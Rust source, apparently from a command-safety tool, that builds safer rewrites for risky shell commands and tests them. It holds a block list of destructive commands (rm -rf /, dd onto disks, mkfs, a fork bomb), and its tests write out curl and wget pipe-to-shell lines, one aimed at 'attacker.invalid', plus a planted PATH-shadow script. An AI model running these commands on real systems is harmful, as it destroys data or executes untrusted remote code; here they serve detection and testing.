/// Archive command names recognized by the `ArchiveExtract` rule.
fn archive_command_kind(cmd: &str) -> Option<&'static str> {
    match cmd {
        "tar" => Some("tar"),
        "unzip" => Some("unzip"),
        "7z" => Some("7z"),
        _ => None,
    }
}

/// Find the archive filename in an extract command's args. For `tar` it's the
/// first non-flag arg after `-f`/`--file` (incl. combined `-xzf <file>`); for
/// `unzip` the first non-flag arg; for `7z` the first non-flag arg after the verb.
fn find_archive_arg(args: &[String], kind: &str) -> Option<String> {
    let mut i = 0;
    while i < args.len() {
        let arg = strip_quotes(&args[i]);
        if arg == "-f" || arg == "--file" {
            if let Some(next) = args.get(i + 1) {
                let v = strip_quotes(next);
                if !v.starts_with('-') {
                    return Some(v);
                }
            }
        }
        if let Some(rest) = arg.strip_prefix("--file=") {
            return Some(rest.to_string());
        }
        // Combined short form `-xzf` / `-tzf` — `-f` is the trailing letter.
        if arg.starts_with('-')
            && !arg.starts_with("--")
            && arg.len() > 2
            && arg.ends_with('f')
            && arg[1..].chars().all(|c| c.is_ascii_alphanumeric())
        {
            if let Some(next) = args.get(i + 1) {
                let v = strip_quotes(next);
                if !v.starts_with('-') {
                    return Some(v);
                }
            }
        }
        i += 1;
    }

    // For unzip / 7z: take the first non-flag positional (skipping the verb for 7z).
    match kind {
        "unzip" => args
            .iter()
            .map(|a| strip_quotes(a))
            .find(|a| !a.starts_with('-') && !a.is_empty()),
        "7z" => {
            let mut it = args.iter().map(|a| strip_quotes(a));
            // Skip the verb (`x`, `e`, …).
            let _verb = it.find(|a| !a.starts_with('-') && !a.is_empty())?;
            it.find(|a| !a.starts_with('-') && !a.is_empty())
        }
        _ => None,
    }
}

/// Build the preview-then-extract rewrite for a flagged archive command. `None`
/// when multi-segment, the leader isn't `tar`/`unzip`/`7z`, or no archive arg.
fn rewrite_archive_list_first(segments: &[tokenize::Segment], shell: ShellType) -> Option<String> {
    if segments.len() != 1 {
        return None;
    }
    let seg = &segments[0];
    let cmd = base_command(seg.command.as_deref()?, shell);
    let kind = archive_command_kind(&cmd)?;
    let archive = find_archive_arg(&seg.args, kind)?;
    let archive = sanitize_for_display(&archive);
    if archive.is_empty() {
        return None;
    }
    // Single-quote ONLY the untrusted archive path on the preview half; the
    // `{raw}` tail is the user's own original command, re-emitted verbatim, and
    // must NOT be re-quoted (that would corrupt its existing flags/quoting).
    let archive = shell_single_quote(&archive)?;
    let raw = seg.raw.trim();
    // `tar -tf` (no compression flag) auto-detects compression on modern GNU &
    // BSD tar; hard-coding `-tzf` (gzip) would break non-gzip variants.
    Some(match kind {
        "tar" => format!("tar -tf {archive} | head && {raw}"),
        "unzip" => format!("unzip -l {archive} | head && {raw}"),
        "7z" => format!("7z l {archive} | head && {raw}"),
        _ => return None,
    })
}

// ── Dotfile backup-first redirect ──────────────────────────────────────────

/// Extract the redirect target from a `> ~/.<file>` / `>> $HOME/.<file>` shape,
/// returning the literal token as written.
fn dotfile_redirect_target(cmd: &str) -> Option<String> {
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] != b'>' {
            i += 1;
            continue;
        }
        let mut j = i + 1;
        if j < bytes.len() && bytes[j] == b'>' {
            j += 1;
        }
        while j < bytes.len() && bytes[j].is_ascii_whitespace() {
            j += 1;
        }
        let rest = &cmd[j..];
        let prefixes = ["~/.", "$HOME/."];
        for prefix in &prefixes {
            if rest.starts_with(prefix) {
                let end = rest
                    .find(|c: char| c.is_ascii_whitespace() || c == ';' || c == '|' || c == '&')
                    .unwrap_or(rest.len());
                let token = &rest[..end];
                if !token.is_empty() {
                    return Some(token.to_string());
                }
            }
        }
        i = j;
    }
    None
}

/// Expand `~/...` and `$HOME/...` to an absolute filesystem path for the
/// dotfile existence check.
fn expand_dotfile_to_fs_path(token: &str) -> Option<std::path::PathBuf> {
    let home = std::env::var_os("HOME")?;
    let home = std::path::PathBuf::from(home);
    if let Some(rest) = token.strip_prefix("~/") {
        return Some(home.join(rest));
    }
    if let Some(rest) = token.strip_prefix("$HOME/") {
        return Some(home.join(rest));
    }
    None
}

/// Build the backup-then-redirect rewrite for a dotfile-overwrite command. Only
/// fires when the target dotfile exists (backing up a missing file just errors).
fn rewrite_dotfile_backup_first(
    cmd: &str,
    segments: &[tokenize::Segment],
    _shell: ShellType,
) -> Option<String> {
    if segments.len() != 1 {
        return None;
    }
    let target_token = dotfile_redirect_target(cmd)?;
    let fs_path = expand_dotfile_to_fs_path(&target_token)?;
    if !Path::new(&fs_path).exists() {
        return None;
    }
    let target_token = sanitize_for_display(&target_token);
    if target_token.is_empty() {
        return None;
    }
    // The token is `~/.…` or `$HOME/.…` and MUST stay unquoted so the shell
    // still expands `~` / `$HOME` in the generated `cp` (single-quoting it would
    // create a literal `~`/`$HOME` directory). We therefore can't neutralize an
    // injected `$( )` / backtick by quoting — instead refuse the rewrite unless
    // the path after the prefix is plain path characters. The `{cmd}` tail is
    // the user's own original command, re-emitted verbatim (not re-quoted).
    if !dotfile_redirect_token_is_safe(&target_token) {
        return None;
    }
    Some(format!(
        "cp {target_token} {target_token}.bak && {cmd}",
        cmd = cmd.trim()
    ))
}

// ── Sudo narrow (command-shape based) ──────────────────────────────────────

/// Interactive shells that must never be the "narrowed" base of a `sudo`
/// rewrite — suggesting `sh` for `sudo sh` still yields a root shell and drops
/// the visible `sudo` cue.
fn is_interactive_shell(name: &str) -> bool {
    matches!(
        name,
        "sh" | "bash" | "zsh" | "fish" | "dash" | "ksh" | "tcsh" | "pwsh" | "powershell" | "nu"
    )
}

/// Heuristic catch-all for destructive command shapes the engine doesn't model
/// but where dropping `sudo` is obviously wrong (e.g. `rm -rf /` still danger
/// just as the current user). The suggester's stricter mandate: never produce a
/// rewrite a reviewer would call worse than `--help`.
fn looks_obviously_destructive(inner: &str) -> bool {
    // Normalize whitespace runs, then match against the LEADING segment only.
    let collapsed: String = inner.split_whitespace().collect::<Vec<_>>().join(" ");
    let lower = collapsed.to_ascii_lowercase();
    let triggers = [
        "rm -rf /",
        "rm -rf /*",
        "rm -fr /",
        "rm -fr /*",
        "rm -rf ~",
        "rm -rf $home",
        "rm -rf --no-preserve-root",
        "rm --no-preserve-root -rf /",
        "dd if=/dev/zero of=/dev/sd",
        "mkfs ",
        ":(){ :|:&};:",
    ];
    triggers.iter().any(|t| lower.starts_with(t))
}

/// Strip a leading `sudo`, returning the inner command as raw text (quoting /
/// spacing preserved). `None` when no inner command can be located. Handles
/// common option flags (`-u USER`, `--user=USER`, `--`); exotic flags fall
/// through to no-rewrite rather than risk a wrong strip.
fn strip_sudo_prefix(cmd: &str, shell: ShellType) -> Option<String> {
    let segs = tokenize::tokenize(cmd, shell);
    let seg = segs.first()?;
    let leader = base_command(seg.command.as_deref()?, shell);
    if leader != "sudo" {
        return None;
    }

    let value_short = ["-u", "-g", "-C", "-D", "-R", "-T"];
    let value_long = [
        "--user",
        "--group",
        "--close-from",
        "--chdir",
        "--role",
        "--type",
        "--other-user",
        "--host",
        "--timeout",
    ];

    let mut idx = 0;
    let mut start_arg = None;
    while idx < seg.args.len() {
        let arg = strip_quotes(&seg.args[idx]);
        if arg == "--" {
            start_arg = Some(idx + 1);
            break;
        }
        if arg.starts_with("--") {
            if value_long.iter().any(|f| arg == *f) {
                idx += 2;
            } else {
                // `--flag=value` consumes one slot.
                idx += 1;
            }
            continue;
        }
        if arg.starts_with('-') && arg.len() > 1 {
            if value_short.iter().any(|f| arg == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        start_arg = Some(idx);
        break;
    }

    let start = start_arg?;
    if start >= seg.args.len() {
        return None;
    }
    // Reassemble from the raw segment so quoting is preserved verbatim: find
    // where the first inner-arg token begins and return everything onward.
    let first_arg = &seg.args[start];
    let stripped = strip_quotes(first_arg);
    let raw = &seg.raw;
    let pos = raw
        .find(first_arg.as_str())
        .or_else(|| raw.find(stripped.as_str()))?;
    Some(raw[pos..].trim().to_string())
}

/// Build the sudo-narrow suggestion. Fires when: (i) the leader is `sudo`,
/// (ii) the verdict has a finding (caller-checked), (iii) the stripped leader
/// is NOT an interactive shell, and (iv) re-analyzing the inner command yields
/// [`Action::Allow`].
///
/// (iii) failing returns a `safe_command: None` interactive-shell suggestion;
/// (iv) failing returns `None` (per-finding suggestions already cover it).
fn build_sudo_narrow_suggestion(
    ctx: &AnalysisContext,
    segments: &[tokenize::Segment],
    _verdict: &Verdict,
    policy: Option<&Policy>,
) -> Option<SafeSuggestion> {
    let cmd = &ctx.input;
    let shell = ctx.shell;
    let leader = base_command(segments.first()?.command.as_deref()?, shell);
    if leader != "sudo" {
        return None;
    }

    let inner = strip_sudo_prefix(cmd, shell)?;
    if inner.is_empty() {
        return None;
    }

    // (iii) interactive-shell trip wire on the stripped leader.
    let inner_segs = tokenize::tokenize(&inner, shell);
    let inner_leader = inner_segs
        .first()
        .and_then(|s| s.command.as_deref())
        .map(|c| base_command(c, shell))
        .unwrap_or_default();
    if is_interactive_shell(&inner_leader) {
        return Some(SafeSuggestion {
            rule_id: "sudo_narrow".to_string(),
            safe_command: None,
            rationale: "no safe mechanical rewrite available; avoid interactive root shells — \
                 run the specific non-privileged command you intended, or use sudo only \
                 for the minimal command that requires elevation."
                .to_string(),
            remediation: "Identify the single command that needs elevation, then prefix only \
                          that command with sudo. Don't run an interactive root shell."
                .to_string(),
        });
    }

    // Refuse obvious shell-builtin destructiveness (`rm -rf /`) before
    // re-analysis — the engine doesn't model these, but the suggester must not
    // advise something worse than the original.
    if looks_obviously_destructive(&inner) {
        return None;
    }

    // (iv) re-analyze the stripped command; if it still flags, sudo wasn't the
    // dangerous part — per-finding suggestions cover it.
    let inner_ctx = context_with_input(ctx, inner.clone());
    let inner_verdict = match policy {
        Some(snapshot) => engine::analyze_with_policy_without_bypass(&inner_ctx, snapshot),
        None => engine::analyze_without_bypass_returning_policy(&inner_ctx).0,
    };
    if inner_verdict.action != Action::Allow {
        return None;
    }

    Some(SafeSuggestion {
        rule_id: "sudo_narrow".to_string(),
        safe_command: Some(inner),
        rationale: "The command is safe to run without sudo — dropping the sudo prefix \
                    removes a privilege the inner command does not require."
            .to_string(),
        remediation: "Re-run the command without sudo. If the underlying tool genuinely \
                      needs root, narrow sudo to only the minimal command that does."
            .to_string(),
    })
}

// ── Env scrub (command-shape based) ────────────────────────────────────────

/// Currently-set sensitive env vars in stable (deterministic) order. The
/// effective list MERGES the built-in `sensitive_env.toml` names with the user's
/// `policy.env_guard_sensitive_vars` (M9 ch4) so an `env -u …` rewrite never
/// silently omits a user-declared secret. Verified callers reuse their captured
/// snapshot; the private raw-candidate test path discovers a partial policy.
fn sensitive_env_set_in_process(cwd: Option<&str>, policy: Option<&Policy>) -> Vec<String> {
    let discovered;
    let policy = match policy {
        Some(snapshot) => snapshot,
        None => {
            discovered = Policy::discover_partial(cwd);
            &discovered
        }
    };
    let effective = crate::env_guard::effective_sensitive_vars(&policy.env_guard_sensitive_vars);
    effective
        .into_iter()
        .filter(|name| std::env::var_os(name).is_some_and(|v| !v.is_empty()))
        .collect()
}

/// `true` when `cmd` is a single simple command that `env -u VAR … <cmd>` can
/// safely wrap. `env -u` only scrubs the immediately-following process — any
/// compound construct (`|`, `&&`/`||`, `;`, redirections, `&`, `` ` ``/`$(`,
/// subshells) spawns children that inherit the caller's env, so wrapping it
/// would leak the secret through later stages.
///
/// Scans byte-by-byte tracking quote/escape state: single quotes make contents
/// literal; in double quotes only `$`/`` ` ``/`\` retain meaning, so command
/// substitution (`` ` ``, `$(`) is flagged outside single quotes only.
fn is_simple_command_for_env_scrub(cmd: &str) -> bool {
    // Both quote flags can't be true at once — POSIX doesn't nest the two.
    let mut in_single = false;
    let mut in_double = false;
    let mut escape = false;

    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];

        // Backslash outside single quotes consumes the next byte verbatim;
        // inside single quotes it's literal (POSIX has no escape there).
        if escape {
            escape = false;
            i += 1;
            continue;
        }
        if b == b'\\' && !in_single {
            escape = true;
            i += 1;
            continue;
        }

        if in_single {
            if b == b'\'' {
                in_single = false;
            }
            i += 1;
            continue;
        }
        if in_double {
            match b {
                b'"' => in_double = false,
                // Command substitution is active even inside double quotes.
                b'`' => return false,
                b'$' if i + 1 < bytes.len() && bytes[i + 1] == b'(' => return false,
                _ => {}
            }
            i += 1;
            continue;
        }

        // Unquoted — flag any shell-compound metacharacter.
        match b {
            b'\'' => in_single = true,
            b'"' => in_double = true,
            b'|' | b'&' | b';' | b'>' | b'<' | b'(' | b')' | b'`' => return false,
            b'$' if i + 1 < bytes.len() && bytes[i + 1] == b'(' => return false,
            _ => {}
        }
        i += 1;
    }

    // Unterminated quotes / trailing backslash — not-simple; a malformed
    // command is exactly where guessing the wrapper is most dangerous.
    !(in_single || in_double || escape)
}

/// Build an env-scrub suggestion when: (i) the dedicated
/// [`RuleId::EnvSensitiveExposedToUnknownScript`] finding is present (M9 ch4) OR
/// any High-severity finding is (M6 ch5, kept for compat); (ii) a sensitive env
/// var is set in this process; (iii) the shell is POSIX (`env -u` doesn't exist
/// on PowerShell); and (iv) the command is a single simple command (else a
/// compound construct would leak the secret — see
/// [`is_simple_command_for_env_scrub`]). `None` otherwise.
fn build_env_scrub_suggestion(
    cmd: &str,
    shell: ShellType,
    verdict: &Verdict,
    cwd: Option<&str>,
    policy: Option<&Policy>,
) -> Option<SafeSuggestion> {
    // Fire on the dedicated M9 ch4 rule (explicit, audit-visible) OR any
    // High-severity finding (M6 ch5 compat heuristic).
    let dedicated_rule_present = verdict
        .findings
        .iter()
        .any(|f| f.rule_id == RuleId::EnvSensitiveExposedToUnknownScript);
    let any_high = verdict
        .findings
        .iter()
        .any(|f| f.severity >= Severity::High);
    if !dedicated_rule_present && !any_high {
        return None;
    }

    // `env -u VAR …` is POSIX-only; the PowerShell equivalent can't be a single
    // inline command without mutating the caller's session env. Decline rather
    // than ship a broken rewrite (the per-rule remediation covers PowerShell).
    if shell == ShellType::PowerShell {
        return None;
    }

    let set_vars = sensitive_env_set_in_process(cwd, policy);
    if set_vars.is_empty() {
        return None;
    }

    // A compound construct would leak the secret through later stages.
    if !is_simple_command_for_env_scrub(cmd.trim()) {
        return None;
    }

    let mut rewrite = String::from("env");
    for var in &set_vars {
        rewrite.push_str(" -u ");
        rewrite.push_str(var);
    }
    rewrite.push(' ');
    rewrite.push_str(cmd.trim());

    Some(SafeSuggestion {
        rule_id: "env_scrub".to_string(),
        safe_command: Some(rewrite),
        rationale: format!(
            "Unsets {} sensitive env var(s) currently in your environment before \
             running the command, so a malicious script cannot exfiltrate them.",
            set_vars.len()
        ),
        remediation: "Unset sensitive environment variables (API tokens, cloud credentials) \
                      before running untrusted commands, or use `env -u VAR ...` to scrub them \
                      for a single invocation."
            .to_string(),
    })
}

// ── Shared helpers ──────────────────────────────────────────────────────────

/// URL-fetch command base names that piping into a shell is dangerous for.
fn is_url_fetch_command(cmd: &str) -> bool {
    matches!(cmd, "curl" | "wget" | "http" | "https" | "xh" | "fetch")
}

/// Strip one matched pair of surrounding quotes (`"` or `'`).
fn strip_quotes(s: &str) -> String {
    let t = s.trim();
    if t.len() >= 2
        && ((t.starts_with('"') && t.ends_with('"')) || (t.starts_with('\'') && t.ends_with('\'')))
    {
        t[1..t.len() - 1].to_string()
    } else {
        t.to_string()
    }
}

/// Reduce a command token to its base name: strip the directory and (PowerShell)
/// a trailing `.exe`. Mirrors how the detector identifies commands.
fn base_command(cmd: &str, shell: ShellType) -> String {
    let stripped = strip_quotes(cmd);
    let base = stripped
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(&stripped)
        .to_string();
    if shell == ShellType::PowerShell {
        base.strip_suffix(".exe")
            .or_else(|| base.strip_suffix(".EXE"))
            .unwrap_or(&base)
            .to_ascii_lowercase()
    } else {
        base
    }
}

fn starts_with_http(s: &str) -> bool {
    let b = s.as_bytes();
    (b.len() >= 8 && b[..8].eq_ignore_ascii_case(b"https://"))
        || (b.len() >= 7 && b[..7].eq_ignore_ascii_case(b"http://"))
}

/// Strip ASCII control characters so a rewritten command echoed to the terminal
/// cannot smuggle ANSI escapes or newlines from a hostile URL.
fn sanitize_for_display(s: &str) -> String {
    s.chars().filter(|c| !c.is_ascii_control()).collect()
}

/// Wrap an untrusted token in single quotes for safe interpolation into a
/// generated shell command, escaping each embedded `'` as `'\''`
/// (`foo'bar` → `'foo'\''bar'`). Single quotes make every other byte literal,
/// so `$( )`, backtick, `;`, `|`, `&`, spaces, and globs cannot break out.
///
/// Returns `None` when the token contains a byte that cannot be safely carried
/// in a single-token single-quoted string — a newline (`\n`) or NUL — so the
/// caller refuses the rewrite rather than emit a multi-line / truncated command.
///
/// `pub` so the copy-paste suggestion surfaces in both crates can neutralize an
/// attacker-controlled URL/domain before interpolating it into a suggested
/// `tirith trust add …` line (`output.rs::write_block_advisories`,
/// `trust.rs::format_add_line`): a blocked URL carrying `$( )`, backticks, `;`,
/// spaces, redirects, or globs would otherwise EXECUTE when the developer copies
/// the line. `sanitize_field` only strips terminal-control bytes; it is NOT a
/// shell escaper.
pub fn shell_single_quote(s: &str) -> Option<String> {
    if s.bytes().any(|b| b == b'\n' || b == b'\0') {
        return None;
    }
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for ch in s.chars() {
        if ch == '\'' {
            // Close the quote, emit an escaped literal `'`, reopen the quote.
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    Some(out)
}

/// Validate a `~`/`$HOME`-prefixed dotfile redirect token for safe *unquoted*
/// interpolation. These tokens must stay unquoted so the shell still expands
/// `~` / `$HOME`, so we cannot single-quote them; instead we require the path
/// *after* the leading `~/` or `$HOME/` to contain only ordinary path
/// characters. Anything else (`$`, backtick, `(`, glob, redirection, …) in the
/// remainder is an injection or glob attempt, and the caller refuses the
/// rewrite. The extractor already bars whitespace / `;` / `|` / `&`, so this is
/// belt-and-suspenders against `$(…)`, backticks, globs, and stray redirections.
fn dotfile_redirect_token_is_safe(token: &str) -> bool {
    let remainder = token
        .strip_prefix("~/")
        .or_else(|| token.strip_prefix("$HOME/"));
    let Some(remainder) = remainder else {
        // Unexpected shape (the extractor only emits these two prefixes); refuse.
        return false;
    };
    // The remainder is a plain relative path: filename chars plus `/`.
    !remainder.is_empty()
        && remainder
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '/' | '+' | '@'))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::verdict::{Evidence, Timings};

    // Transformation-shape unit tests intentionally exercise the private raw
    // candidate layer. Public `suggest` is covered by integration tests and may
    // only return a command after whole-command verification.
    fn suggest(cmd: &str, shell: ShellType, verdict: &Verdict) -> Vec<SafeSuggestion> {
        let ctx = default_exec_context(cmd, shell);
        suggest_candidates_with_runner(
            &ctx,
            verdict,
            None,
            Some(Path::new("/usr/local/bin/tirith")),
        )
    }

    fn finding(rule_id: RuleId) -> Finding {
        Finding {
            rule_id,
            severity: Severity::High,
            title: "t".into(),
            description: "d".into(),
            evidence: vec![Evidence::Text { detail: "e".into() }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }
    }

    fn verdict_with(findings: Vec<Finding>) -> Verdict {
        Verdict::from_findings(findings, 3, Timings::default())
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    fn assert_injected_tirith_prefix(command: &str, shell: ShellType) {
        let marker = " run --capsule --script-stdin --interpreter ";
        let (encoded_program, _) = command
            .split_once(marker)
            .unwrap_or_else(|| panic!("missing hardened runner marker: {command}"));
        let decoded = decode_shell_literal(encoded_program, shell)
            .unwrap_or_else(|| panic!("runner path is not one literal shell word: {command}"));
        assert_eq!(
            decoded, "/usr/local/bin/tirith",
            "rewrite must bind the injected absolute executable"
        );
        assert!(Path::new(&decoded).is_absolute());
        assert_ne!(encoded_program, "tirith", "bare PATH lookup is forbidden");
    }

    #[test]
    fn verified_suggestions_reuse_original_policy_snapshot_after_file_change() {
        let repo = tempfile::tempdir().expect("temp repo");
        std::fs::create_dir_all(repo.path().join(".git")).expect("git marker");
        let policy_dir = repo.path().join(".tirith");
        std::fs::create_dir_all(&policy_dir).expect("policy dir");
        let policy_path = policy_dir.join("policy.yaml");
        std::fs::write(
            &policy_path,
            "custom_rules:\n  - id: forbid-example-fetch\n    when:\n      url.host: example.com\n    severity: medium\n    title: forbidden\n    context: [exec]\n",
        )
        .expect("write policy");

        let mut ctx = default_exec_context("curl -k https://example.com/file", ShellType::Posix);
        ctx.cwd = Some(repo.path().display().to_string());
        let (verdict, policy) = engine::analyze_without_bypass_returning_policy(&ctx);
        assert!(
            verdict
                .findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::CustomRuleMatch),
            "original snapshot must contain the repo-local custom rule: {verdict:?}"
        );

        // Simulate a policy TOCTOU between original analysis and candidate
        // verification. The captured policy must remain authoritative.
        std::fs::remove_file(&policy_path).expect("remove live policy");
        let suggestions = suggest_verified_with_policy(&ctx, &verdict, &policy);
        assert!(
            suggestions
                .iter()
                .all(|suggestion| suggestion.safe_command.is_none()),
            "removing the live file must not make a snapshot-forbidden candidate executable: {suggestions:?}"
        );

        let candidate_ctx = context_with_input(&ctx, "curl https://example.com/file".to_string());
        let candidate_verdict = engine::analyze_with_policy_without_bypass(&candidate_ctx, &policy);
        assert!(
            candidate_verdict
                .findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::CustomRuleMatch),
            "snapshot re-analysis must retain the removed custom rule: {candidate_verdict:?}"
        );
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn curl_pipe_bash_rewrites_to_hardened_capsule_runner() {
        let cmd = "curl -fsSL https://example.com/install.sh | bash";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert_eq!(s.len(), 1);
        let sc = s[0].safe_command.as_deref().unwrap();
        assert_injected_tirith_prefix(sc, ShellType::Posix);
        assert!(sc.ends_with(
            " run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
        ));
        assert!(!sc.contains("/tmp/"), "{sc}");
        assert!(!sc.contains(" && "), "{sc}");
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn common_curl_body_flags_keep_the_typed_rewrite() {
        let cmd = "curl -fsSL https://example.com/install.sh | bash";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let command = s[0].safe_command.as_deref().expect("runner rewrite");
        assert_injected_tirith_prefix(command, ShellType::Posix);
        assert!(command.ends_with(
            " run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
        ));
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn curl_rewrite_requires_matching_status_and_redirect_semantics() {
        for command in [
            "curl https://example.com/install.sh | bash",
            "curl -f https://example.com/install.sh | bash",
            "curl -L https://example.com/install.sh | bash",
        ] {
            let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
            let suggestions = suggest(command, ShellType::Posix, &verdict);
            assert!(
                suggestions[0].safe_command.is_none(),
                "mismatched curl redirect/status semantics must stay guidance-only: {command}"
            );
        }

        for command in [
            "curl -fsSL https://example.com/install.sh | bash",
            "curl --fail --silent --show-error --location https://example.com/install.sh | bash",
        ] {
            let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
            let suggestions = suggest(command, ShellType::Posix, &verdict);
            assert!(
                suggestions[0].safe_command.is_some(),
                "equivalent curl status/redirect semantics should remain rewritable: {command}"
            );
        }
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn pipe_rewrite_is_guidance_only_without_immutable_self_reinvocation() {
        let ctx = default_exec_context(
            "curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let suggestions = suggest_candidates_with_runner(&ctx, &verdict, None, None);
        assert!(suggestions[0].safe_command.is_none());
        assert!(suggestions[0]
            .rationale
            .contains("No safe executable rewrite"));
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn emitted_absolute_runner_ignores_a_planted_first_path_tirith() {
        use std::os::unix::fs::PermissionsExt as _;

        let fixture = tempfile::tempdir().expect("PATH-shadow fixture");
        let marker = fixture.path().join("shadow-ran");
        let shadow = fixture.path().join("tirith");
        std::fs::write(
            &shadow,
            format!("#!/bin/sh\nprintf shadow > '{}'\n", marker.display()),
        )
        .expect("write planted tirith");
        std::fs::set_permissions(&shadow, std::fs::Permissions::from_mode(0o700))
            .expect("chmod planted tirith");

        let ctx = default_exec_context(
            "curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let suggestions =
            suggest_candidates_with_runner(&ctx, &verdict, None, Some(Path::new("/bin/true")));
        let command = suggestions[0]
            .safe_command
            .as_deref()
            .expect("absolute runner rewrite");
        assert!(command.starts_with("'/bin/true' run "), "{command}");

        let status = std::process::Command::new("/bin/sh")
            .args(["-c", command])
            .env("PATH", fixture.path())
            .status()
            .expect("evaluate generated command under hostile PATH");
        assert!(status.success());
        assert!(
            !marker.exists(),
            "generated command resolved the planted PATH shadow"
        );
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn emitted_capsule_runner_reanalyzes_allow_with_original_policy_snapshot() {
        let ctx = default_exec_context(
            "curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        let (verdict, policy) = engine::analyze_without_bypass_returning_policy(&ctx);
        assert_ne!(verdict.action, Action::Allow, "original pipeline must flag");

        let suggestions = suggest_verified_with_policy_and_runner(
            &ctx,
            &verdict,
            &policy,
            Some(Path::new("/usr/local/bin/tirith")),
        );
        let command = suggestions
            .iter()
            .find_map(|suggestion| suggestion.safe_command.as_deref())
            .expect("verified runner command");
        assert_injected_tirith_prefix(command, ShellType::Posix);
        assert!(command.ends_with(
            " run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
        ));

        let candidate_ctx = context_with_input(&ctx, command.to_string());
        let candidate = engine::analyze_with_policy_without_bypass(&candidate_ctx, &policy);
        assert_eq!(
            candidate.action,
            Action::Allow,
            "the exact emitted runner invocation must be Allow under the original policy snapshot: {candidate:?}"
        );
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn trusted_runner_composes_tls_transport_and_pipe_fixes_into_one_allow_command() {
        let ctx = default_exec_context(
            "curl -k -fsSL http://attacker.invalid/script | bash",
            ShellType::Posix,
        );
        let (verdict, policy) = engine::analyze_without_bypass_returning_policy(&ctx);
        assert_ne!(verdict.action, Action::Allow);

        let suggestions = suggest_verified_with_policy_and_runner(
            &ctx,
            &verdict,
            &policy,
            Some(Path::new("/usr/local/bin/tirith")),
        );
        let command = suggestions
            .iter()
            .find_map(|suggestion| suggestion.safe_command.as_deref())
            .expect("one fully composed runner command");
        assert_injected_tirith_prefix(command, ShellType::Posix);
        assert!(command.ends_with(
            " run --capsule --script-stdin --interpreter bash 'https://attacker.invalid/script'"
        ));
        assert!(!command.contains("curl "));
        assert!(!command.contains(" -k"));

        let candidate_ctx = context_with_input(&ctx, command.to_string());
        let candidate = engine::analyze_with_policy_without_bypass(&candidate_ctx, &policy);
        assert_eq!(candidate.action, Action::Allow);
    }

    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
    #[test]
    fn pipe_to_shell_is_guidance_only_without_runner_support() {
        let cmd = "curl -fsSL https://example.com/install.sh | bash";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert!(s[0].safe_command.is_none());
        assert!(s[0].rationale.contains("No safe executable rewrite"));
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn wget_stdout_pipe_sh_uses_same_hardened_runner() {
        let cmd = "wget -qO- https://example.com/x.sh | sh";
        let v = verdict_with(vec![finding(RuleId::WgetPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let sc = s[0].safe_command.as_deref().unwrap();
        assert_injected_tirith_prefix(sc, ShellType::Posix);
        assert!(sc.ends_with(
            " run --capsule --script-stdin --interpreter sh 'https://example.com/x.sh'"
        ));
        assert!(!sc.contains("wget "), "{sc}");
    }

    #[test]
    fn wget_without_stdout_mode_is_guidance_only() {
        let cmd = "wget https://example.com/x.sh | sh";
        let v = verdict_with(vec![finding(RuleId::WgetPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert!(s[0].safe_command.is_none());
    }

    #[test]
    fn pipe_with_extra_stage_yields_no_rewrite() {
        // Three segments — too complex for a correct one-line rewrite.
        let cmd = "curl -fsSL https://example.com/x.sh | tac | bash";
        let v = verdict_with(vec![finding(RuleId::PipeToInterpreter)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert_eq!(s.len(), 1);
        assert!(s[0].safe_command.is_none(), "{:?}", s[0].safe_command);
        assert!(!s[0].remediation.is_empty());
    }

    #[test]
    fn pipe_with_two_urls_yields_no_rewrite() {
        let cmd = "curl -fsSL https://a.example/x https://b.example/y | bash";
        let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert!(s[0].safe_command.is_none());
    }

    #[test]
    fn insecure_tls_flag_dropped() {
        let cmd = "curl -k https://example.com/install.sh";
        let v = verdict_with(vec![finding(RuleId::InsecureTlsFlags)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let sc = s[0].safe_command.as_deref().unwrap();
